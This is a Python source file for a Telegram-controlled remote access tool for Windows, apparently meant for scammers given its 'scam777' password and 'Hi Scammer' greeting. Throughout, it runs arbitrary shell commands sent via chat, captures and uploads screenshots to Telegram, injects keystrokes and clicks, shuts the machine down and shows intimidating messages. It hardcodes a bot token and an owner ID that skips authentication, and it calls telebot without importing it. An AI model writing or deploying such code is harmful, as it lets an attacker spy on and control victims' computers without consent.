import time
import subprocess
import os
import mouse
import keyboard
import pyautogui

password = "scam777"

auth = False
msgSenden = False
smthWentWrong = False


def me():
    returned_output = str(subprocess.check_output("whoami"))[2:-1]
    return returned_output


def clickLeft():
    mouse.click("left")


def clickRight():
    mouse.click("right")


def shutdown():
    os.system("shutdown -p")


def typing(text):
    time.sleep(0.2)
    keyboard.write(text)


def switchWindow():
    keyboard.press("alt")
    keyboard.press("tab")
    keyboard.release("alt")
    keyboard.release("tab")


def closeWindow():
    keyboard.press("alt")
    keyboard.press("f4")
    keyboard.release("alt")
    keyboard.release("f4")


def hideWindows():
    keyboard.press("win")
    keyboard.press("d")
    keyboard.release("win")
    keyboard.release("d")


def changeLanguage():
    keyboard.press("shift")
    keyboard.press("alt")
    keyboard.release("shift")
    keyboard.release("alt")


def Mystify():
    os.system("Mystify.scr -a")


def watchingYou():
    os.system("start cmd")
    time.sleep(0.1)
    keyboard.write("I am watching you...", 0.1)
    time.sleep(1.0)
    keyboard.press("alt")
    keyboard.press("f4")
    keyboard.release("alt")
    keyboard.release("f4")


def cmdCommand(cmd):
    os.system(cmd)


def matrixRun():
    os.startfile("matrix.bat")
    time.sleep(0.1)
    keyboard.press("alt")
    keyboard.press("enter")
    keyboard.release("alt")
    keyboard.release("enter")


def pressKey(key):
    keyboard.press(key)
    keyboard.release(key)


def dragMouse(x, y):
    mouse.drag(0, 0, x, y, absolute=False, duration=0.02)


def alert(text):
    pyautogui.alert(text=text, title="Alert", button="OK")


def warning(text):
    pyautogui.alert(text=text, title="Warning", button="OK")


def scroll(direction):
    for i in range(8):
        mouse.wheel(int(direction))


bot = telebot.TeleBot("2104206797:AAEkqcC6cWILcYhIc_9rC3JGqk9XC32dAd8")

while True:
    try:
        @bot.message_handler(content_types=["text"])
        def get_text_messages(message):
            global auth
            global msgSenden
            data = message.text.lower()
            if smthWentWrong:
                bot.send_message(message.from_user.id, "Something went wrong, but now all is good (I hope so)")
            if auth:
                if data == "me?" or data == "whoami" or data == "me":
                    bot.send_message(message.from_user.id, me())
                elif data == "help":
                    bot.send_message(message.from_user.id,
                                     "*help show this*\n1)me -- whoami\n2)clkL -- left click\n3)clkR -- right click\n"
                                     "4)shutdown -- turn computer off\n5)switch -- alt+tab\n6)close -- alt+f4\n"
                                     "7)lang -- shift+alt\n8)mystify -- Mystify.scr -a\n 9)hide -- win+d\n10)watching -- 'i am watching you...'\n"
                                     "11)type=msg -- typing msg\n12)cmd=command -- starting command in cmd\n"
                                     "13)drag=pos1 pos2 -- dragging to pos1 pos2\n14)alert=text -- make alert with text\n"
                                     "15)warning=text -- make warning with text\n16)scroll=1/-1 -- scroll up/down\n"
                                     "17)press=button -- pressing button\n\n"
                                     "version 1.0.1")
                elif data == "clickLeft" or data == "clkL" or data == "clkl":
                    clickLeft()
                    bot.send_message(message.from_user.id, "Successfully clicked left button")
                elif data == "clickRight" or data == "clkR" or data == "clkr":
                    clickRight()
                    bot.send_message(message.from_user.id, "Successfully clicked right button")
                elif data == "shutdown" or data == "sd" or data == "shd":
                    shutdown()
                    bot.send_message(message.from_user.id, "Trying to shutdown computer...")
                elif data == "screen" or data == "screenshot":
                    screenshot = pyautogui.screenshot()
                    screenshot.save("screenshot1.png")
                    photo = open("screenshot1.png", "rb")
                    bot.send_photo(message.from_user.id, photo)
                    photo.close()
                    os.remove("screenshot1.png")
                elif data == "switch" or data == "alttab" or data == "altab":
                    switchWindow()
                    bot.send_message(message.from_user.id, "Successfully switched window")
                elif data == "close" or data == "closeWindow" or data == "clWin":
                    closeWindow()
                    bot.send_message(message.from_user.id, "Successfully closed window")
                elif data == "lang" or data == "switchLang":
                    changeLanguage()
                    bot.send_message(message.from_user.id, "Successfully changed language")
                elif data == "Mystify" or data == "mystify" or data == "myst":
                    Mystify()
                    bot.send_message(message.from_user.id, "Turning Mystify on...")
                elif data == "hide" or data == "hideWindows" or data == "hidW":
                    hideWindows()
                    bot.send_message(message.from_user.id, "Successfully hid all windows")
                elif data == "iamwatchingyou" or data == "watching":
                    watchingYou()
                    bot.send_message(message.from_user.id, "Successfully typed 'I am watching you...'")
                elif data == "matrix":
                    matrixRun()
                    bot.send_message(message.from_user.id, "Successfully turned matrix on")
                elif "alert" in data or "note" in data:
                    spisok = data.split("=")
                    try:
                        alert(spisok[1])
                        bot.send_message(message.from_user.id, "Successfully sent alert")
                    except IndexError:
                        bot.send_message(message.from_user.id, "Error 2: Invalid syntax")
                    except Exception:
                        bot.send_message(message.from_user.id, "Unknown error")
                elif "scroll" in data:
                    spisok = data.split("=")
                    try:
                        scroll(spisok[1])
                        bot.send_message(message.from_user.id, "Successfully scrolled")
                    except IndexError:
                        bot.send_message(message.from_user.id, "Error 2: Invalid syntax")
                    except Exception:
                        bot.send_message(message.from_user.id, "Unknown error")
                elif "warn" in data or "warning" in data:
                    spisok = data.split("=")
                    try:
                        warning(str(spisok[1]).capitalize())
                        bot.send_message(message.from_user.id, "Successfully sent warning")
                    except IndexError:
                        bot.send_message(message.from_user.id, "Error 2: Invalid syntax")
                    except Exception:
                        bot.send_message(message.from_user.id, "Unknown error")
                elif "type" in data:
                    spisok = data.split("=", 1)
                    bot.send_message(message.from_user.id, "Successfully typed your text")
                    try:
                        typing(spisok[1])
                    except IndexError:
                        bot.send_message(message.from_user.id, "Error 2: Invalid syntax")
                    except Exception:
                        bot.send_message(message.from_user.id, "Unknown error")
                elif "cmd" in data:
                    spisok = data.split("=")
                    try:
                        cmdCommand(spisok[1])
                        bot.send_message(message.from_user.id, "Successfully ran your command in cmd")
                    except IndexError:
                        bot.send_message(message.from_user.id, "Error 2: Invalid syntax")
                    except Exception:
                        bot.send_message(message.from_user.id, "Unknown error")
                elif "press" in data:
                    spisok = data.split("=")
                    try:
                        pressKey(spisok[1])
                        bot.send_message(message.from_user.id, "Successfully pressed key")
                    except IndexError:
                        bot.send_message(message.from_user.id, "Error 2: Invalid syntax")
                    except Exception:
                        bot.send_message(message.from_user.id, "Unknown error")
                elif "drag" in data:
                    spisok = data.split("=")
                    try:
                        cords = spisok[1].split()
                        dragMouse(cords[0], cords[1])
                        bot.send_message(message.from_user.id, "Successfully drugged mouse")
                    except IndexError:
                        bot.send_message(message.from_user.id, "Error 2: Invalid syntax")
                    except Exception:
                        bot.send_message(message.from_user.id, "Unknown error")
                else:
                    bot.send_message(message.from_user.id, "Error 1: unknown command")
            elif auth is False:
                if message.from_user.id != 269389407 * 3:
                    if not msgSenden:
                        bot.send_message(message.from_user.id,
                                         "You can't send commands, because you didn't authenticated\n\nenter password to auth")
                        msgSenden = True
                    else:
                        if data == password:
                            bot.send_message(message.from_user.id, "You've been authenticated!")
                            auth = True
                        else:
                            bot.send_message(message.from_user.id, "Wrong password, try again")
                else:
                    auth = True
                    bot.send_message(message.from_user.id, "Hi Scammer, how're u?)")


        bot.polling(none_stop=True, interval=0)
    except Exception:
        try:
            smthWentWrong = True
        except Exception:
            pass
